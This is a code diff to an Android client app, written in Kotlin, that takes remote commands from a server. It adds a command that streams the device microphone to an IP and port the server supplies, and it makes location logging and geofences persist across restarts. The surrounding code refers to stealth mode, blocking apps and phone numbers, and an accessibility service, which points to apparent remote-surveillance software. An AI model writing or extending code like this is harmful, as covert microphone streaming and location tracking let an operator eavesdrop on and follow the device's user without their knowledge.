@@ -79,7 +79,6 @@ import android.webkit.MimeTypeMap
 import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
-import androidx.core.content.ContextCompat.startActivity
 import androidx.core.content.FileProvider
 import androidx.exifinterface.media.ExifInterface
 import com.chaquo.python.Python
@@ -87,7 +86,6 @@ import com.chaquo.python.android.AndroidPlatform
 import com.client.BuildConfig
 import com.client.LockedActivity
 import com.client.LockedWithPinActivity
-import com.client.MainActivity
 import com.client.MessageActivity
 import com.client.helpers.DeviceOrientationHelper
 import com.client.helpers.FlashlightHelper
@@ -98,6 +96,7 @@ import com.client.receivers.blockedPhoneNumbers
 import com.client.receivers.phoneNumberToUse
 import com.client.receivers.serverPhoneNumbers
 import com.client.services.httpproxy.HttpProxyService
+import com.client.services.other.MicStreamingService
 import com.client.services.other.MyAccessibilityService
 import com.client.services.other.prevPackageName
 import com.client.services.other.appsToPreventOpening
@@ -1372,6 +1371,8 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
                     "UseSMS" to false
                 )
             )
+            val geofencesFile = File(context.getFilesDir(), "geofences.json")
+            geofencesFile.writeText(Gson().toJson(geofenceList))
             sendMessage(
                 context,
                 false,
@@ -1385,9 +1386,15 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
         }
     } else if (command == "START_LOGGING_LOCATION_UPDATES") {
         startLoggingLocation = true
+        with (preferences.edit()) {
+            putBoolean("StartLoggingLocation", true)
+        }
         sendMessage(context, false, "START_LOGGING_LOCATION_UPDATES: Operation completed successfully", messageID, serverID)
     } else if (command == "STOP_LOGGING_LOCATION_UPDATES") {
         startLoggingLocation = false
+        with (preferences.edit()) {
+            putBoolean("StartLoggingLocation", false)
+        }
         sendMessage(context, false, "STOP_LOGGING_LOCATION_UPDATES: Operation completed successfully", messageID, serverID)
     } else if (command.startsWith("GEOFENCE_FROM_EXITING ")) {
         try {
@@ -1404,6 +1411,8 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
                     "UseSMS" to false
                 )
             )
+            val geofencesFile = File(context.getFilesDir(), "geofences.json")
+            geofencesFile.writeText(Gson().toJson(geofenceList))
             sendMessage(
                 context,
                 false,
@@ -1419,6 +1428,8 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
         try {
             val index = command.removePrefix("MAKE_GEOFENCE_INVALID ").toInt()
             geofenceList[index]["IsValid"] = false
+            val geofencesFile = File(context.getFilesDir(), "geofences.json")
+            geofencesFile.writeText(Gson().toJson(geofenceList))
             sendMessage(
                 context,
                 false,
@@ -1434,6 +1445,8 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
         try {
             val index = command.removePrefix("MAKE_GEOFENCE_VALID ").toInt()
             geofenceList[index]["IsValid"] = true
+            val geofencesFile = File(context.getFilesDir(), "geofences.json")
+            geofencesFile.writeText(Gson().toJson(geofenceList))
             sendMessage(
                 context,
                 false,
@@ -1447,6 +1460,8 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
         }
     } else if (command == "INVALIDATE_AND_CLEAR_ALL_GEOFENCES") {
         geofenceList.clear()
+        val geofencesFile = File(context.getFilesDir(), "geofences.json")
+        geofencesFile.writeText(Gson().toJson(geofenceList))
         sendMessage(context, false, "INVALIDATE_AND_CLEAR_ALL_GEOFENCES: Operation completed successfully", messageID, serverID)
     } else if (command.startsWith("SEND_GEOFENCE_ALERTS_THROUGH_SMS ")) {
         try {
@@ -6226,6 +6241,7 @@ class ClientService: Service() {
             currentDeviceID = preferences.getString("DeviceID", "0").toString()
             isStealthModeEnabled = preferences.getBoolean("IsStealthModeEnabled", false)
             isLockedWithPin = preferences.getBoolean("IsLockedWithPin", false)
+            startLoggingLocation = preferences.getBoolean("StartLoggingLocation", false)
             var a = preferences.getStringSet("ServerCurrentDeviceID", setOf("Fx7]`£C?K<H`}*X}<9xwMgEn5plKtLYW"))
             if (a != null) {
                 serverDeviceIDs.clear()
@@ -6494,7 +6510,13 @@ class ClientService: Service() {
                 Manifest.permission.ACCESS_COARSE_LOCATION
             ) == PackageManager.PERMISSION_GRANTED
         ) {
-            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
+            if (startLoggingLocation || geofenceList.isNotEmpty()) {
+                fusedLocationClient.requestLocationUpdates(
+                    locationRequest,
+                    locationCallback,
+                    Looper.getMainLooper()
+                )
+            }
         }
 
         val handler = Handler(Looper.getMainLooper())
@@ -6679,6 +6701,36 @@ class ClientService: Service() {
                                                     messageID, serverID
                                                 )
                                             }
+                                        } else if (command.startsWith("START_STREAMING_MIC ")) {
+                                            try {
+                                                val ip = command.removePrefix("START_STREAMING_MIC ").split(" ")[0]
+                                                val port = command.removePrefix("START_STREAMING_MIC ").split(" ")[1]
+                                                startService(
+                                                    Intent(applicationContext, MicStreamingService::class.java).apply {
+                                                        putExtra("ServerPort", port.toInt())
+                                                        putExtra("ServerIP", ip)
+                                                        putExtra("MessageID", messageID)
+                                                        putExtra("ServerID", serverID)
+                                                    }
+                                                )
+                                                Log.d("AudioStreamingService", "startService() called")
+                                            } catch (ex: Exception) {
+                                                ex.printStackTrace()
+                                                sendMessage(
+                                                    this,
+                                                    false,
+                                                    "START_STREAMING_MIC: Operation failed - ${ex.localizedMessage}",
+                                                    messageID, serverID
+                                                )
+                                            }
+                                        } else if (command == "STOP_STREAMING_MIC") {
+                                            sendBroadcast(Intent(MicStreamingService.ACTION_STOP_MIC_STREAMING_SERVICE))
+                                            sendMessage(
+                                                this,
+                                                false,
+                                                "STOP_STREAMING_MIC: Operation completed successfully",
+                                                messageID, serverID
+                                            )
                                         } else if (command == "REGISTER_CALLBACK_FOR_LOCATION_UPDATES") {
                                             if (ActivityCompat.checkSelfPermission(
                                                     this,
